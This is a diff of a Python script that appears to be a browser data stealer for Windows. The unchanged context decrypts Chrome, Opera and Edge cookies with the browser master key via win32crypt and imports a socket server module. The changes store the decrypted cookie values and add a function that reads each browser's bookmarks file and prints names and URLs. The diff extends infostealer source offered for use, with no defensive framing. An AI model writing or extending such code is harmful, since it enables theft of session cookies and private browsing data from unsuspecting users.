@@ -1,6 +1,7 @@
 import sqlite3
 import json
 import csv
+import re
 import base64
 import win32crypt
 import Sockets.sckt_server as server
@@ -165,7 +166,7 @@ def get_cookies(nav):
     cursor1 = cnn1.cursor()
 
     cursor.execute(SQL["COOKIES_SQL"])
-    cursor1.execute('''CREATE TABLE cookies(host_key, name, encrypted_value, path, is_httponly, creation_utc, expires_utc, last_access_utc)''')
+    cursor1.execute('''CREATE TABLE cookies(host_key, name, value, path, is_httponly, creation_utc, expires_utc, last_access_utc)''')
     try:
         for i in cursor.fetchall():
             decrypted_cookies = decrypt_pass(i[2], master_Key(nav))
@@ -178,7 +179,26 @@ def get_cookies(nav):
         cnn.close()
 
 def get_bookmarks(nav):
-    pass
+    global path
+
+    if nav =="Chrome":
+        path = PATH["CHROME_BOOKMARKS_FILE_PATH"]
+    elif nav == "Opera":
+        path = PATH["OPERAGX_BOOKMARKS_FILE_PATH"]
+    elif nav == "Edge":
+        path = PATH["EDGE_BOOKMARKS_FILE_PATH"]
+    try:
+        with open(path, 'r', encoding="utf-8-sig") as f:
+
+            json_data = f.read()
+            data = []
+            match_date_added = re.findall("\"date_added\": \"(.*?)\",([\s\S]*?)\"guid\": \"", json_data, re.S)
+            match_name = re.findall("\"name\": \"(.*?)\",([\s\S]*?)\"type\": \"url\"", json_data, re.S)
+            match_url = re.findall("\"url\": \"(.*?)\"", json_data, re.S)
+            for i in range(0, len(match_url)):
+                print(match_name[i][0],match_url[i])
+    except FileNotFoundError:
+        print("No hay fichero")
 
 def main():
     options = { 1: run_server,
